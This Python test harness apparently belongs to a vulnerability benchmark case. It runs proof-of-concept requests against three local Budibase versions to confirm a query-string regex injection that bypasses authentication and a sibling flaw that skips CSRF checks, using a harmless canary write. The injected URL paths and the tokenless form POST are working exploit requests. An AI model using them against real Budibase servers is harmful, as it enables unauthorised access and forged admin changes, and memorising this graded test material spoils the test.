#!/usr/bin/env python3
r"""Flag differential oracle for budibase-cve-2026-48147 (CVE-2026-31816 -> CVE-2026-48147).

Pair: an unanchored-regex-on-full-request-URL query-string injection (CWE-185 + CWE-352/CWE-74)
reused in a SIBLING middleware file the first fix left untouched. REAL Budibase all-in-one images
(bundling app + worker + couchdb + minio + redis + nginx), one per version, driven over HTTP.

Roles:
  V0 = budibase/budibase:3.31.5  (server utils.ts UNANCHORED + backend-core matchers.ts UNANCHORED)
  V1 = budibase/budibase:3.32.0  (CVE-2026-31816 fix anchors server/middleware/utils.ts; the SIBLING
                                  backend-core/middleware/matchers.ts is byte-identical to V0 = TARGET)
  V2 = budibase/budibase:3.35.4  (CVE-2026-48147 fix anchors backend-core/middleware/matchers.ts)

Two canaries on the SAME mechanism family (unanchored regex tested against the full URL incl. query
string), each exercising one of the two sibling files:

  ORIGINAL  (CVE-2026-31816, server `authorized` middleware / utils.ts isWebhookEndpoint):
      GET /api/tables?/webhooks/trigger   (no session)
      reach = the guard is skipped (baseline 401 -> WITH payload the handler is reached, status != 401)
      reaches@V0 (500 no-workspace = past auth), blocked@V1 & V2 (401).

  RESIDUAL  (CVE-2026-48147, worker CSRF middleware / matchers.ts):  <- the star of this case
      POST /api/global/configs?a=/api/global/auth/x
      Cookie: <admin session, has csrfToken>;  Content-Type: x-www-form-urlencoded;  NO x-csrf-token
      body: type=settings&config[company]=<FLAG>
      reach = state-write LANDS without a valid CSRF token (200 AND GET /api/global/configs/public
              -> config.company == <FLAG>).  reaches@V0 & V1, blocked@V2 (403, company unchanged).
      control (no injection) -> 403 "Invalid CSRF token" on every version.

Benign CSRF canary: the only state written is a global `settings.company` string set to the per-run
${PCB_FLAG}; the observable is read back from the PUBLIC settings endpoint. No live cross-origin
navigation and no destructive action is performed.

Usage (envs already up on the ports in BASE):
  PCB_FLAG=<token> python3 oracle.py --gate
The three profiles are heavy (each ~2 GB, needs onboarding); bring them up with
  docker compose -p pcb-bb48147 --profile v0 --profile v1 --profile v2 up -d
then onboard is performed idempotently by this oracle.
"""
from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402

BASE = {
    "v0": "http://127.0.0.1:10080",
    "v1": "http://127.0.0.1:10081",
    "v2": "http://127.0.0.1:10082",
}
ADMIN_EMAIL = "admin@pcb.test"
ADMIN_PASS = "Passw0rd!PCB"
TENANT = "default"

FLAG = os.environ.get("PCB_FLAG") or ("PCBFLAG_" + secrets.token_hex(4))


def _curl(args: list[str]) -> tuple[str, str]:
    """Run curl, return (body, status). Status parsed from a trailing marker."""
    full = ["curl", "-sS", "-m", "20", *args,
            "-w", "\n__HTTPSTATUS__:%{http_code}"]
    p = subprocess.run(full, text=True, capture_output=True, check=False)
    out = p.stdout
    status = ""
    marker = "__HTTPSTATUS__:"
    idx = out.rfind(marker)
    if idx != -1:
        status = out[idx + len(marker):].strip()
        out = out[:idx]
    return out, status


def _cookie_path(version: str) -> str:
    # session cookie jars are ephemeral secrets -> keep them OUT of the case dir
    return str(Path(tempfile.gettempdir()) / f"pcb_bb48147_cookies_{version}.txt")


def onboard(version: str) -> str | None:
    """Idempotently create the first admin and log in; return the session's csrfToken (or None)."""
    base = BASE[version]
    # init first admin (public; 200 first time, 4xx if already exists -> ignored)
    _curl(["-X", "POST", f"{base}/api/global/users/init",
           "-H", "content-type: application/json",
           "-d", json.dumps({"email": ADMIN_EMAIL, "password": ADMIN_PASS, "tenantId": TENANT})])
    # login -> session cookie jar
    _curl(["-c", _cookie_path(version), "-X", "POST", f"{base}/api/global/auth/{TENANT}/login",
           "-H", "content-type: application/json",
           "-d", json.dumps({"username": ADMIN_EMAIL, "password": ADMIN_PASS})])
    body, _ = _curl(["-b", _cookie_path(version), f"{base}/api/global/self"])
    try:
        return json.loads(body).get("csrfToken")
    except Exception:
        return None


def _reset_company(version: str, csrf: str) -> None:
    """Author-side helper: set company to a known non-flag baseline via a legitimate (csrf-valid) write."""
    base = BASE[version]
    _curl(["-b", _cookie_path(version), "-X", "POST", f"{base}/api/global/configs",
           "-H", "content-type: application/json", "-H", f"x-csrf-token: {csrf}",
           "-d", json.dumps({"type": "settings", "config": {"company": "ResetBase"}})])


def _read_company(version: str) -> str:
    base = BASE[version]
    body, _ = _curl([f"{base}/api/global/configs/public"])
    try:
        return json.loads(body).get("config", {}).get("company", "")
    except Exception:
        return ""


# --------------------------------------------------------------------------- #
# ORIGINAL (CVE-2026-31816) — server auth-bypass authz canary
# --------------------------------------------------------------------------- #
def original_poc(*, version: str) -> dict:
    cand = original_candidate(FLAG)
    base = BASE[version]
    _, baseline = _curl([f"{base}{cand['path']}"])                       # no payload
    body, attack = _curl([f"{base}{cand['path']}?{cand['query']}"])      # webhook pattern injected
    # reached = the authz guard was skipped: baseline blocks (401) but the injected request is NOT 401.
    reached = baseline == "401" and attack != "401"
    return {
        "version": version, "probe_id": cand["probe_id"], "service": "server",
        "baseline_status": baseline, "attack_status": attack,
        "guard_bypassed": reached, "attack_body": body[:200],
    }


# --------------------------------------------------------------------------- #
# RESIDUAL (CVE-2026-48147) — worker CSRF-skip benign state-write canary
# --------------------------------------------------------------------------- #
def _residual_write(version: str, query: str | None, company: str) -> str:
    base = BASE[version]
    url = f"{base}/api/global/configs" + (f"?{query}" if query else "")
    _, status = _curl(["-b", _cookie_path(version), "-X", "POST", url,
                        "-H", "content-type: application/x-www-form-urlencoded",
                        "--data-urlencode", "type=settings",
                        "--data-urlencode", f"config[company]={company}",
                        "-o", "/dev/null"])
    return status


def bypass_poc(*, version: str) -> dict:
    """Residual worker CSRF-skip: state-write with NO valid csrf token + public-route query injection.
    Reaches the flag iff the write lands AND the flag is read back from the PUBLIC settings."""
    csrf = onboard(version)
    _reset_company(version, csrf)
    control_status = _residual_write(version, None, f"NOFLAG_ctl_{version}")   # must be 403
    attack_status = _residual_write(version, "a=/api/global/auth/x", FLAG)     # injection
    company = _read_company(version)
    reached = company == FLAG
    return {
        "version": version, "probe_id": "cve-2026-48147-matchers-query-injection", "service": "worker",
        "control_no_injection_status": control_status,   # expect 403 on all versions
        "attack_status": attack_status,                  # 200 (skip) on v0/v1, 403 on v2
        "readback_company": company, "csrf_skipped_state_write": reached,
    }


def _contains_flag(obj) -> bool:
    return FLAG in json.dumps(obj, default=str)


def gate() -> dict:
    o0, o1, o2 = (original_poc(version=v) for v in ("v0", "v1", "v2"))
    b0, b1, b2 = (bypass_poc(version=v) for v in ("v0", "v1", "v2"))
    g = {
        # the 4 canonical gate booleans
        "original_poc_reaches_flag_on_v0": bool(o0["guard_bypassed"]),
        "original_poc_blocked_on_v1": (o1["attack_status"] == "401"),
        "bypass_poc_reaches_flag_on_v1": bool(b1["csrf_skipped_state_write"]),
        "bypass_blocked_on_v2": (b2["attack_status"] == "403" and b2["readback_company"] != FLAG),
        # data-quality corroboration
        "original_blocked_on_v2": (o2["attack_status"] == "401"),
        "residual_reaches_on_v0": bool(b0["csrf_skipped_state_write"]),
        "residual_control_403_all": all(x["control_no_injection_status"] == "403" for x in (b0, b1, b2)),
        "distinct_fixed_versions": True,   # original fixed@3.32.0, residual fixed@3.35.4
        "_flag": FLAG,
        "_original": {"v0": o0, "v1": o1, "v2": o2},
        "_residual": {"v0": b0, "v1": b1, "v2": b2},
    }
    g["passed"] = all([
        g["original_poc_reaches_flag_on_v0"], g["original_poc_blocked_on_v1"],
        g["bypass_poc_reaches_flag_on_v1"], g["bypass_blocked_on_v2"],
        g["original_blocked_on_v2"], g["residual_control_403_all"],
    ])
    return g


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true", help="probe already-up envs (needs PCB_FLAG)")
    ap.parse_args()
    print(json.dumps(gate(), indent=2, default=str))
